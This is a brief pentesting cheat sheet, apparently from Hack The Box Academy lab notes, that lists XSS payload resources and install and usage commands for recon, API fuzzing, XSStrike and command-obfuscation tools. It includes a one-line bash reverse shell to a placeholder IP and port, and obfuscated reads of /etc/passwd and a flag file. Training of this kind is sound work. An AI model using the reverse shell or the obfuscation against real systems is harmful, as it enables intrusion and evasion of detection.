# Web Sites
- [PayloadsAllTheTHings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [xss-payload-list](https://github.com/payloadbox/xss-payload-list)

# ReconSpider
- Download
```bash
pip3 install scrapy
wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
unzip ReconSpider.zip
```
- Example
```bash
python3 ReconSpider.py http://inlanefreight.com
``` 

# Fuzzing the API
- Download
```bash
git clone https://github.com/PandaSt0rm/webfuzz_api.git
cd webfuzz_api
pip3 install -r requirements.txt
```
- Example
```bash
python3 api_fuzzer.py http://IP:PORT
``` 
# xsstrike
- Download
```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
```
- Example
```bash
python3 xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
``` 
# Reverse shell
```bash
bash -c 'bash -i >& /dev/tcp/TU_IP/PUERTO 0>&1 2>&1'
``` 
# Deofuscation
## Linux
- Download
```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```
- Example
```bash
cd ./bashfuscator/bin/
./bashfuscator -c 'cat /etc/passwd'
```
## Windows
- Download
```bash
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
```
- Example
```bash
Invoke-DOSfuscation
SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
encoding
1
``` 
